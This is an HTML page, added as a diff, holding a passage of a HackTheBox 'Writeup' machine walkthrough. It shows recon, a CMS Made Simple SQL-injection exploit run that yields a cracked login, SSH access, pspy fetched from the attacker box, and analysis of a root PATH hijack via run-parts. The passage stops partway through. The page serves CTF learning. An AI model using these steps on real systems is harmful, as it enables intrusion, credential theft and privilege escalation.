@@ -1,0 +1,454 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone.io</title>
+    <link rel="stylesheet" href="../../../../css/style.css">
+  </head>
+
+<body>
+
+<section>
+
+    <writeup>
+        <h1><strong>hackthebox Writeup</strong></h1>
+        <em>Released: June 2019 / Pwned: June 26th 2019 - [+] Solved whilst Active</em><br>
+        <br>
+        <img alt="images\2-1.png" src="images/2-1.png"><br>
+        <br>
+        This machine was fun! The web app effectively bans the use of tools, forcing you to gather information yourself, and the root, whilst not easy to spot in the slightest, was in my opinion a very creatively designed challenge. The developer should make more machines :)<br>
+        <br>
+        <a id="h3-1" name="h3-1"></a><strong></strong>
+        <h4><strong>Summary</strong></h4>
+        • Check <code>/robots.txt</code> and find an informative directory<br>
+        • View-source of said informative directory to find a reference to a management system<br>
+        • <code>searchsploit</code> for exploits and run a sql injection exploit to earn credentials<br>
+        • <code>ssh</code> in and get user.txt<br>
+        • Run <code>pspy</code> and wait for users to <code>ssh</code> in to catch some crucial information<br>
+        • Create malicious version of <code>run-parts</code> command in <code>/usr/local/sbin</code> to earn root whenever a user ssh's into the machine<br>
+        <br>
+        <a id="h2-1" name="h2-1"></a><strong></strong>
+        <h2><strong>1) Nmap</strong></h2><br>
+        Initial scan:<br>
+        <code>nmap -sC -sV -O -oN nmap/initial.txt 10.10.10.138</code><br>
+        <br>
+        -sC default scripts<br>
+        -sV service enumeration<br>
+        -O OS detection<br>
+        -oN default output<br>
+        <br>
+        Results:<br>
+            <div class="codebox">
+                root@gotham:~/ctf/writeup#&nbsp;mkdir&nbsp;nmap<br>
+                root@gotham:~/ctf/writeup#&nbsp;nmap&nbsp;-sC&nbsp;-sV&nbsp;-O&nbsp;-oN&nbsp;nmap/initial.txt&nbsp;10.10.10.138<br>
+                ...<br>
+                Host&nbsp;is&nbsp;up&nbsp;(0.041s&nbsp;latency).<br>
+                Not&nbsp;shown:&nbsp;998&nbsp;filtered&nbsp;ports<br>
+                PORT&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE&nbsp;VERSION<br>
+                22/tcp&nbsp;open&nbsp;&nbsp;ssh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OpenSSH&nbsp;7.4p1&nbsp;Debian&nbsp;10+deb9u6&nbsp;(protocol&nbsp;2.0)<br>
+                |&nbsp;ssh-hostkey:&nbsp;<br>
+                |&nbsp;&nbsp;&nbsp;2048&nbsp;dd:53:10:70:0b:d0:47:0a:e2:7e:4a:b6:42:98:23:c7&nbsp;(RSA)<br>
+                |&nbsp;&nbsp;&nbsp;256&nbsp;37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28&nbsp;(ECDSA)<br>
+                |_&nbsp;&nbsp;256&nbsp;93:ea:a8:40:42:c1:a8:33:85:b3:56:00:62:1c:a0:ab&nbsp;(ED25519)<br>
+                80/tcp&nbsp;open&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;Apache&nbsp;httpd&nbsp;2.4.25&nbsp;((Debian))<br>
+                |&nbsp;http-robots.txt:&nbsp;1&nbsp;disallowed&nbsp;entry&nbsp;<br>
+                |_/writeup/<br>
+                |_http-server-header:&nbsp;Apache/2.4.25&nbsp;(Debian)<br>
+                |_http-title:&nbsp;Nothing&nbsp;here&nbsp;yet.<br>
+                Warning:&nbsp;OSScan&nbsp;results&nbsp;may&nbsp;be&nbsp;unreliable&nbsp;because&nbsp;we&nbsp;could&nbsp;not&nbsp;find&nbsp;at&nbsp;least&nbsp;1&nbsp;open&nbsp;and&nbsp;1&nbsp;closed&nbsp;port<br>
+                Aggressive&nbsp;OS&nbsp;guesses:&nbsp;Linux&nbsp;3.10&nbsp;-&nbsp;4.11&nbsp;(92%),&nbsp;Linux&nbsp;3.12&nbsp;(92%),&nbsp;Linux&nbsp;3.13&nbsp;(92%),&nbsp;Linux&nbsp;3.13&nbsp;or&nbsp;4.2&nbsp;(92%),&nbsp;Linux&nbsp;3.16&nbsp;(92%),&nbsp;Linux&nbsp;3.16&nbsp;-&nbsp;4.6&nbsp;(92%),&nbsp;Linux&nbsp;3.2&nbsp;-&nbsp;4.9&nbsp;(92%),&nbsp;Linux&nbsp;3.8&nbsp;-&nbsp;3.11&nbsp;(92%),&nbsp;Linux&nbsp;4.2&nbsp;(92%),&nbsp;Linux&nbsp;4.4&nbsp;(92%)<br>
+                No&nbsp;exact&nbsp;OS&nbsp;matches&nbsp;for&nbsp;host&nbsp;(test&nbsp;conditions&nbsp;non-ideal).<br>
+                Service&nbsp;Info:&nbsp;OS:&nbsp;Linux;&nbsp;CPE:&nbsp;cpe:/o:linux:linux_kernel<br>
+                <br>
+                OS&nbsp;and&nbsp;Service&nbsp;detection&nbsp;performed.&nbsp;Please&nbsp;report&nbsp;any&nbsp;incorrect&nbsp;results&nbsp;at&nbsp;https://nmap.org/submit/&nbsp;.<br>
+                Nmap&nbsp;done:&nbsp;1&nbsp;IP&nbsp;address&nbsp;(1&nbsp;host&nbsp;up)&nbsp;scanned&nbsp;in&nbsp;18.09&nbsp;seconds
+            </div>
+        </div><br>
+        <br>
+        A full port scan didn't reveal anything new.<br>
+        <br>
+        <strong>Services running:</strong><br>
+        • 22/ssh - nothing to do here for the time being<br>
+        • 80/http - this is the only place to look, so that's where we're heading<br>
+        <br>
+        <a id="h1-2" name="h1-2"></a><strong></strong>
+        <h1><strong>Ports &amp; Services</strong></h1>
+        <br>
+        <a id="h2-2" name="h2-2"></a><strong></strong>
+        <h2><strong>2) 80/http</strong></h2><br>
+        <code>http://10.10.10.138</code><br>
+        <img alt="images\2-2.png" src="images/2-2.png"><br>
+        <br>
+        This message implies that you shouldn't run any scripts against the site, otherwise you'll risk being IP banned.<br>
+        <br>
+        Nmap, when scanning port 80, found 1 disallowed entry in <code>/robots.txt</code>:<br>
+            <div class="codebox">
+                ...<br>
+                80/tcp&nbsp;open&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;Apache&nbsp;httpd&nbsp;2.4.25&nbsp;((Debian))<br>
+                |&nbsp;http-robots.txt:&nbsp;1&nbsp;disallowed&nbsp;entry&nbsp;
+            </div>
+        </div><br>
+        <br>
+        <code>http://10.10.10.138/robotst.txt</code><br>
+        <img alt="images\2-3.png" src="images/2-3.png"><br>
+        <br>
+        <code>http://10.10.10.138/writeup/</code> contains some write-ups for previous hackthebox machines.<br>
+        <img alt="images\2-4.png" src="images/2-4.png"><br>
+        <br>
+        If you view-source of the <code>http://10.10.10.138/writeup/</code> page, you'll see a reference to the <em>CMS Made Simple</em> content management system for websites.<br>
+        <img alt="images\2-5.png" src="images/2-5.png"><br>
+        <br>
+        <a id="h2-3" name="h2-3"></a><strong></strong>
+        <h2><strong>2a) searchsploit CMS Made Simple</strong></h2><br>
+        If you search for exploits for <em>CMS Made Simple</em>, you'll find quite a few.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/writeup#&nbsp;searchsploit&nbsp;CMS&nbsp;Made&nbsp;Simple<br>
+                ----------------------------------------------------------------&nbsp;----------------------------------------<br>
+                &nbsp;Exploit&nbsp;Title&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;Path<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;(/usr/share/exploitdb/)<br>
+                ----------------------------------------------------------------&nbsp;----------------------------------------<br>
+                CMS&nbsp;Made&nbsp;Simple&nbsp;(CMSMS)&nbsp;Showtime2&nbsp;-&nbsp;File&nbsp;Upload&nbsp;Remote&nbsp;Code&nbsp;Exe&nbsp;|&nbsp;exploits/php/remote/46627.rb<br>
+                CMS&nbsp;Made&nbsp;Simple&nbsp;0.10&nbsp;-&nbsp;'Lang.php'&nbsp;Remote&nbsp;File&nbsp;Inclusion&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;exploits/php/webapps/26217.html<br>
+                CMS&nbsp;Made&nbsp;Simple&nbsp;0.10&nbsp;-&nbsp;'index.php'&nbsp;Cross-Site&nbsp;Scripting&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;exploits/php/webapps/26298.txt<br>
+                CMS&nbsp;Made&nbsp;Simple&nbsp;1.0.2&nbsp;-&nbsp;'SearchInput'&nbsp;Cross-Site&nbsp;Scripting&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;exploits/php/webapps/29272.txt<br>
+                CMS&nbsp;Made&nbsp;Simple&nbsp;1.0.5&nbsp;-&nbsp;'Stylesheet.php'&nbsp;SQL&nbsp;Injection&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;exploits/php/webapps/29941.txt<br>
+                CMS&nbsp;Made&nbsp;Simple&nbsp;1.11.10&nbsp;-&nbsp;Multiple&nbsp;Cross-Site&nbsp;Scripting&nbsp;Vulnera&nbsp;|&nbsp;exploits/php/webapps/32668.txt<br>
+                CMS&nbsp;Made&nbsp;Simple&nbsp;1.11.9&nbsp;-&nbsp;Multiple&nbsp;Vulnerabilities&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;exploits/php/webapps/43889.txt<br>
+                CMS&nbsp;Made&nbsp;Simple&nbsp;1.2&nbsp;-&nbsp;Remote&nbsp;Code&nbsp;Execution&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;exploits/php/webapps/4442.txt<br>
+                CMS&nbsp;Made&nbsp;Simple&nbsp;1.2.2&nbsp;Module&nbsp;TinyMCE&nbsp;-&nbsp;SQL&nbsp;Injection&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;exploits/php/webapps/4810.txt<br>
+                CMS&nbsp;Made&nbsp;Simple&nbsp;1.2.4&nbsp;Module&nbsp;FileManager&nbsp;-&nbsp;Arbitrary&nbsp;File&nbsp;Uploa&nbsp;|&nbsp;exploits/php/webapps/5600.php<br>
+                CMS&nbsp;Made&nbsp;Simple&nbsp;1.4.1&nbsp;-&nbsp;Local&nbsp;File&nbsp;Inclusion&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;exploits/php/webapps/7285.txt<br>
+                CMS&nbsp;Made&nbsp;Simple&nbsp;1.6.2&nbsp;-&nbsp;Local&nbsp;File&nbsp;Disclosure&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;exploits/php/webapps/9407.txt<br>
+                CMS&nbsp;Made&nbsp;Simple&nbsp;1.6.6&nbsp;-&nbsp;Local&nbsp;File&nbsp;Inclusion&nbsp;/&nbsp;Cross-Site&nbsp;Scrip&nbsp;|&nbsp;exploits/php/webapps/33643.txt<br>
+                CMS&nbsp;Made&nbsp;Simple&nbsp;1.6.6&nbsp;-&nbsp;Multiple&nbsp;Vulnerabilities&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;exploits/php/webapps/11424.txt<br>
+                CMS&nbsp;Made&nbsp;Simple&nbsp;1.7&nbsp;-&nbsp;Cross-Site&nbsp;Request&nbsp;Forgery&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;exploits/php/webapps/12009.html<br>
+                CMS&nbsp;Made&nbsp;Simple&nbsp;1.8&nbsp;-&nbsp;'default_cms_lang'&nbsp;Local&nbsp;File&nbsp;Inclusion&nbsp;&nbsp;&nbsp;|&nbsp;exploits/php/webapps/34299.py<br>
+                CMS&nbsp;Made&nbsp;Simple&nbsp;1.x&nbsp;-&nbsp;Cross-Site&nbsp;Scripting&nbsp;/&nbsp;Cross-Site&nbsp;Request&nbsp;|&nbsp;exploits/php/webapps/34068.html<br>
+                CMS&nbsp;Made&nbsp;Simple&nbsp;2.1.6&nbsp;-&nbsp;Multiple&nbsp;Vulnerabilities&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;exploits/php/webapps/41997.txt<br>
+                CMS&nbsp;Made&nbsp;Simple&nbsp;2.1.6&nbsp;-&nbsp;Remote&nbsp;Code&nbsp;Execution&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;exploits/php/webapps/44192.txt<br>
+                CMS&nbsp;Made&nbsp;Simple&nbsp;2.2.5&nbsp;-&nbsp;(Authenticated)&nbsp;Remote&nbsp;Code&nbsp;Execution&nbsp;&nbsp;&nbsp;|&nbsp;exploits/php/webapps/44976.py<br>
+                CMS&nbsp;Made&nbsp;Simple&nbsp;2.2.7&nbsp;-&nbsp;(Authenticated)&nbsp;Remote&nbsp;Code&nbsp;Execution&nbsp;&nbsp;&nbsp;|&nbsp;exploits/php/webapps/45793.py<br>
+                CMS&nbsp;Made&nbsp;Simple&nbsp;&lt;&nbsp;1.12.1&nbsp;/&nbsp;&lt;&nbsp;2.1.3&nbsp;-&nbsp;Web&nbsp;Server&nbsp;Cache&nbsp;Poisoning&nbsp;|&nbsp;exploits/php/webapps/39760.txt<br>
+                CMS&nbsp;Made&nbsp;Simple&nbsp;&lt;&nbsp;2.2.10&nbsp;-&nbsp;SQL&nbsp;Injection&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;exploits/php/webapps/46635.py<br>
+                CMS&nbsp;Made&nbsp;Simple&nbsp;Module&nbsp;Antz&nbsp;Toolkit&nbsp;1.02&nbsp;-&nbsp;Arbitrary&nbsp;File&nbsp;Uploa&nbsp;|&nbsp;exploits/php/webapps/34300.py<br>
+                CMS&nbsp;Made&nbsp;Simple&nbsp;Module&nbsp;Download&nbsp;Manager&nbsp;1.4.1&nbsp;-&nbsp;Arbitrary&nbsp;File&nbsp;&nbsp;|&nbsp;exploits/php/webapps/34298.py<br>
+                CMS&nbsp;Made&nbsp;Simple&nbsp;Showtime2&nbsp;Module&nbsp;3.6.2&nbsp;-&nbsp;(Authenticated)&nbsp;Arbitr&nbsp;|&nbsp;exploits/php/webapps/46546.py<br>
+                ----------------------------------------------------------------&nbsp;----------------------------------------<br>
+                Shellcodes:&nbsp;No&nbsp;Result
+            </div>
+        </div><br>
+        <br>
+        Since I couldn't find a <em>CMS Made Simple</em> version number, by trial and error I discovered that the sql injection vulnerability is the one that we need - <a href="https://www.exploit-db.com/exploits/46635.">https://www.exploit-db.com/exploits/46635.</a><br>
+        <br>
+        I tested it first by testing the URL provided in the exploit - <code>/moduleinterface.php?mact=News,m1_,default,0</code>.<br>
+        <img alt="images\2-6.png" src="images/2-6.png"><br>
+        <br>
+        You know the SQL injection has worked because we're seeing output from the <em>News</em> table in the web app.<br>
+        <br>
+        Run the exploit and provide it with the <code>rockyou.txt</code> wordlist to crack the password it finds.<br>
+        You'll feel like you're part of a scene from the Matrix haha.<br>
+        <br>
+        (I had to install termcolor for the exploit to work)<br>
+            <div class="codebox">
+                root@gotham:~/ctf/writeup/80-http/exploits#&nbsp;cp&nbsp;/usr/share/exploitdb/exploits/php/webapps/46635.py&nbsp;.<br>
+                root@gotham:~/ctf/writeup/80-http/exploits#&nbsp;mv&nbsp;46635.py&nbsp;sql_injection-2.2.9below.py<br>
+                root@gotham:~/ctf/writeup/80-http/exploits#&nbsp;python&nbsp;sql_injection-2.2.9below.py&nbsp;<br>
+                Traceback&nbsp;(most&nbsp;recent&nbsp;call&nbsp;last):<br>
+                &nbsp;&nbsp;File&nbsp;"sql_injection-2.2.9below.py",&nbsp;line&nbsp;12,&nbsp;in&nbsp;&lt;module&gt;<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;from&nbsp;termcolor&nbsp;import&nbsp;colored<br>
+                ImportError:&nbsp;No&nbsp;module&nbsp;named&nbsp;termcolor<br>
+                root@gotham:~/ctf/writeup/80-http/exploits#&nbsp;pip&nbsp;install&nbsp;termcolor<br>
+                Collecting&nbsp;termcolor<br>
+                Installing&nbsp;collected&nbsp;packages:&nbsp;termcolor<br>
+                Successfully&nbsp;installed&nbsp;termcolor-1.1.0<br>
+                root@gotham:~/ctf/writeup/80-http/exploits#&nbsp;python&nbsp;sql_injection-2.2.9below.py&nbsp;<br>
+                [+]&nbsp;Specify&nbsp;an&nbsp;url&nbsp;target<br>
+                [+]&nbsp;Example&nbsp;usage&nbsp;(no&nbsp;cracking&nbsp;password):&nbsp;exploit.py&nbsp;-u&nbsp;http://target-uri<br>
+                [+]&nbsp;Example&nbsp;usage&nbsp;(with&nbsp;cracking&nbsp;password):&nbsp;exploit.py&nbsp;-u&nbsp;http://target-uri&nbsp;--crack&nbsp;-w&nbsp;/path-wordlist<br>
+                [+]&nbsp;Setup&nbsp;the&nbsp;variable&nbsp;TIME&nbsp;with&nbsp;an&nbsp;appropriate&nbsp;time,&nbsp;because&nbsp;this&nbsp;sql&nbsp;injection&nbsp;is&nbsp;a&nbsp;time&nbsp;based.<br>
+                root@gotham:~/ctf/writeup/80-http/exploits#&nbsp;python&nbsp;sql_injection-2.2.9below.py&nbsp;&nbsp;-u&nbsp;http://10.10.10.138/writeup&nbsp;--crack&nbsp;-w&nbsp;/usr/share/wordlists/rockyou.txt<br>
+                <br>
+                [+]&nbsp;Salt&nbsp;for&nbsp;password&nbsp;found:&nbsp;5a599ef579066807<br>
+                [+]&nbsp;Username&nbsp;found:&nbsp;jkr<br>
+                [+]&nbsp;Email&nbsp;found:&nbsp;jkr@writeup.htb<br>
+                [+]&nbsp;Password&nbsp;found:&nbsp;62def4866937f08cc13bab43bb14e6f7<br>
+                [+]&nbsp;Password&nbsp;cracked:&nbsp;raykayjay9
+            </div>
+        </div><br>
+        <br>
+        <a id="h1-3" name="h1-3"></a><strong></strong>
+        <h1><strong>Gain Access</strong></h1>
+        <br>
+        <a id="h2-4" name="h2-4"></a><strong></strong>
+        <h2><strong>3) Log in</strong></h2><br>
+        Use the credentials discovered by exploit <code>46635.py</code> to log in via ssh.<br>
+        <br>
+        <code>jkr / raykayjay9</code><br>
+        <br>
+            <div class="codebox">
+                root@gotham:~/ctf/writeup#&nbsp;ssh&nbsp;jkr@10.10.10.138<br>
+                ...<br>
+                jkr@10.10.10.138's&nbsp;password:&nbsp;raykayjay9<br>
+                Linux&nbsp;writeup&nbsp;4.9.0-8-amd64&nbsp;x86_64&nbsp;GNU/Linux<br>
+                <br>
+                The&nbsp;programs&nbsp;included&nbsp;with&nbsp;the&nbsp;Devuan&nbsp;GNU/Linux&nbsp;system&nbsp;are&nbsp;free&nbsp;software;<br>
+                the&nbsp;exact&nbsp;distribution&nbsp;terms&nbsp;for&nbsp;each&nbsp;program&nbsp;are&nbsp;described&nbsp;in&nbsp;the<br>
+                individual&nbsp;files&nbsp;in&nbsp;/usr/share/doc/*/copyright.<br>
+                <br>
+                Devuan&nbsp;GNU/Linux&nbsp;comes&nbsp;with&nbsp;ABSOLUTELY&nbsp;NO&nbsp;WARRANTY,&nbsp;to&nbsp;the&nbsp;extent<br>
+                permitted&nbsp;by&nbsp;applicable&nbsp;law.<br>
+                Last&nbsp;login:&nbsp;Wed&nbsp;Jun&nbsp;26&nbsp;05:37:08&nbsp;2019&nbsp;from&nbsp;10.10.14.4<br>
+                jkr@writeup:~$
+            </div>
+        </div><br>
+        <br>
+        And grab user.txt :)<br>
+            <div class="codebox">
+                jkr@writeup:~$&nbsp;pwd<br>
+                /home/jkr<br>
+                jkr@writeup:~$&nbsp;ls<br>
+                pspy64&nbsp;&nbsp;user.txt<br>
+                jkr@writeup:~$&nbsp;cat&nbsp;user.txt<br>
+                d4e49...
+            </div>
+        </div><br>
+        <br>
+        <a id="h1-4" name="h1-4"></a><strong></strong>
+        <h1><strong>Priv-Esc</strong></h1>
+        <br>
+        <a id="h2-5" name="h2-5"></a><strong></strong>
+        <h2><strong>4) pspy</strong></h2><br>
+        To spot the privilege escalation on this machine you'll need to use <code>pspy</code>.<br>
+        <code>pspy</code> is a tool that watches Linux system processes. It's become a common part of my priv-esc info-gathering process ever since I was first introduced to the tool by an earlier hackthebox machine.<br>
+        <br>
+        We're on a 64bit machine, so download <code>pspy64s</code> and serve it to the target system using python.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/writeup#&nbsp;wget&nbsp;https://github.com/DominicBreuker/pspy/releases/download/v1.0.0/pspy64s<br>
+                ...<br>
+                root@gotham:~/ctf/writeup#&nbsp;python&nbsp;-m&nbsp;SimpleHTTPServer<br>
+                Serving&nbsp;HTTP&nbsp;on&nbsp;0.0.0.0&nbsp;port&nbsp;8000&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        Retrieve <code>pspy64s</code> from your attacking box, give the binary execute permissions and run it.<br>
+        You'll see a bunch of processes running.<br>
+            <div class="codebox">
+                jkr@writeup:~$&nbsp;wget&nbsp;http://10.10.14.11:8000/pspy64s<br>
+                ...<br>
+                jkr@writeup:~$&nbsp;ls<br>
+                pspy64s&nbsp;&nbsp;user.txt<br>
+                jkr@writeup:~$&nbsp;chmod&nbsp;+x&nbsp;pspy64s&nbsp;<br>
+                jkr@writeup:~$&nbsp;./pspy64s&nbsp;
+            </div>
+        </div><br>
+        <br>
+        If you're on a VIP machine you most likely won't see anything of use, so refer to section <em>b) VIP woes</em>.<br>
+        If you're on free you're at an advantage in this case because there'll be lots of activity on the box. You can skip section <em>b)</em> and move straight to <em>c) sshd</em>.<br>
+        <br>
+        <a id="h3-2" name="h3-2"></a><strong></strong>
+        <h3><strong>4a) VIP woes</strong></h3><br>
+        You're at a <em>huge</em> disadvantage if you're playing as VIP on this box since you'll most likely never see the piece of information that you need. I only managed to figure out how to progress as a result of a hint by user <em>1NC39T10N</em> on the hackthebox forums. Thanks friend :)<br>
+        <br>
+        <img alt="images\2-7.png" src="images/2-7.png"><br>
+        <br>
+        “the VERY last step needed to get user� <em>1NC39T10N</em> is hinting at is SSH'ing into the box.<br>
+        SSH into <em>Writeup</em> once and run <code>pspy</code><br>
+            <div class="codebox">
+                root@gotham:~/ctf/writeup#&nbsp;ssh&nbsp;jkr@10.10.10.138<br>
+                jkr@10.10.10.138's&nbsp;password:&nbsp;raykayjay9<br>
+                ....<br>
+                jkr@writeup:~$&nbsp;./pspy64s<br>
+                ....
+            </div>
+        </div><br>
+        <br>
+        Now, with <code>pspy</code> running, ssh into the machine again on a separate terminal<br>
+            <div class="codebox">
+                root@gotham:~/ctf/writeup#&nbsp;ssh&nbsp;jkr@10.10.10.138<br>
+                jkr@10.10.10.138's&nbsp;password:&nbsp;raykayjay9<br>
+                ....<br>
+                jkr@writeup:~$
+            </div>
+        </div><br>
+        <br>
+        After you've ssh'd in, check <code>pspy</code> and you should now see the information that you need.<br>
+        <br>
+        <a id="h2-6" name="h2-6"></a><strong></strong>
+        <h2><strong>5) sshd</strong></h2><br>
+        <code>pspy64s</code> will reveal a series of odd events that happen when a user ssh's into the box.<br>
+            <div class="codebox">
+                jkr@writeup:~$&nbsp;./pspy64s&nbsp;<br>
+                ...<br>
+                2019/06/26&nbsp;12:11:45&nbsp;CMD:&nbsp;UID=0&nbsp;&nbsp;&nbsp;&nbsp;PID=1962&nbsp;&nbsp;&nbsp;|&nbsp;sshd:&nbsp;[accepted]<br>
+                2019/06/26&nbsp;12:11:46&nbsp;CMD:&nbsp;UID=0&nbsp;&nbsp;&nbsp;&nbsp;PID=1963&nbsp;&nbsp;&nbsp;|&nbsp;sshd:&nbsp;[accepted]&nbsp;&nbsp;<br>
+                2019/06/26&nbsp;12:11:48&nbsp;CMD:&nbsp;UID=0&nbsp;&nbsp;&nbsp;&nbsp;PID=1964&nbsp;&nbsp;&nbsp;|&nbsp;sshd:&nbsp;jkr&nbsp;[priv]&nbsp;&nbsp;<br>
+                2019/06/26&nbsp;12:11:48&nbsp;CMD:&nbsp;UID=0&nbsp;&nbsp;&nbsp;&nbsp;PID=1965&nbsp;&nbsp;&nbsp;|&nbsp;sh&nbsp;-c&nbsp;/usr/bin/env&nbsp;-i&nbsp;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&nbsp;run-parts&nbsp;--lsbsysinit&nbsp;/etc/update-motd.d&nbsp;&gt;&nbsp;/run/motd.dynamic.new&nbsp;<br>
+                2019/06/26&nbsp;12:11:48&nbsp;CMD:&nbsp;UID=0&nbsp;&nbsp;&nbsp;&nbsp;PID=1966&nbsp;&nbsp;&nbsp;|&nbsp;run-parts&nbsp;--lsbsysinit&nbsp;/etc/update-motd.d&nbsp;<br>
+                2019/06/26&nbsp;12:11:48&nbsp;CMD:&nbsp;UID=0&nbsp;&nbsp;&nbsp;&nbsp;PID=1967&nbsp;&nbsp;&nbsp;|&nbsp;/bin/sh&nbsp;/etc/update-motd.d/10-uname&nbsp;<br>
+                2019/06/26&nbsp;12:11:48&nbsp;CMD:&nbsp;UID=0&nbsp;&nbsp;&nbsp;&nbsp;PID=1968&nbsp;&nbsp;&nbsp;|&nbsp;sshd:&nbsp;jkr&nbsp;[priv]&nbsp;&nbsp;<br>
+                2019/06/26&nbsp;12:11:48&nbsp;CMD:&nbsp;UID=1000&nbsp;PID=1969&nbsp;&nbsp;&nbsp;|&nbsp;sshd:&nbsp;jkr@pts/1&nbsp;&nbsp;&nbsp;
+            </div>
+        </div><br>
+        <br>
+        For the sake of privilege separation, OpenSSH (sshd) creates 2 processes when an SSH connection starts:<br>
+        • 1 process retains root privileges (only used to do root things)<br>
+        • the other process does everything else<br>
+        <br>
+        Those 2 processes are what we're seeing here (I think)<br>
+        <code>2019/06/26 12:11:46 CMD: UID=0 PID=1963 | sshd: [accepted]<br>
+        2019/06/26 12:11:48 CMD: UID=0 PID=1964 | sshd: jkr [priv]</code><br>
+        <br>
+        Before the connected user is dropped into a shell, a command runs:<br>
+        <code>sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d &gt; /run/motd.dynamic.new</code><br>
+        <br>
+        Most of this command is irrelevant except for:<br>
+        • <code>env</code>'s <code>-i</code> flag - which means: <em>ignore the existing environment and run commands in a brand new environment</em><br>
+        • <code>PATH=&lt;directories&gt;</code> - which sets a new PATH variable and points to a series of directories that (should) contain binaries<br>
+        • <code>run-parts</code> - the command that's being run<br>
+        <br>
+        Those directories that the <code>PATH</code> variable is pointing to are suspicious, especially if it's the OpenSSH <em>root privileges</em> process that's running the binaries in those directories.<br>
+        <br>
+        <a id="h2-7" name="h2-7"></a><strong></strong>
+        <h2><strong>6) Check if PATH includes world-writable directories</strong></h2><br>
+        The PATH variable is:<br>
+        <code>PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</code><br>
+        <br>
+        If we can write to any of the directories inside of the PATH variable we could potentially get code execution as root.<br>
+        Have a check to see if any of the directories included in PATH are world-writable.<br>
+            <div class="codebox">
+                jkr@writeup:~$&nbsp;find&nbsp;/&nbsp;-writable&nbsp;-type&nbsp;d&nbsp;2&gt;/dev/null<br>
